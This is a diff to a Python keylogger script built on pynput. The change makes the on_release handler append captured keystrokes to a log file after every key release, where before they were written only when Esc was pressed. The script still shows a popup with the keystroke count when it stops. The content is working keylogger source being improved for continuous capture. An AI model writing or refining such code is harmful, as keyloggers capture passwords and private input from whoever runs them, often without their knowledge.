@@ -38,12 +38,15 @@ def show_popup(message):
 
 def on_release(key):
     global keystroke_count
-    keystroke_count += 1    # track the number of keystrokes
+    keystroke_count += 1
+
+    # Write to file continuously
+    with open(log_file_path, "a") as log_file:
+        log_file.write(''.join(keystrokes))
+        keystrokes.clear()  # Clear the list after writing to avoid duplication
+
     # Stop listener if Esc is pressed
     if key == pynput.keyboard.Key.esc:
-        # Write keystrokes to file
-        with open(log_file_path, "a") as log_file:
-            log_file.write(''.join(keystrokes) + '\n')
         show_popup(f"Keylogger stopped! Total keystrokes: {keystroke_count}")
         return False
 
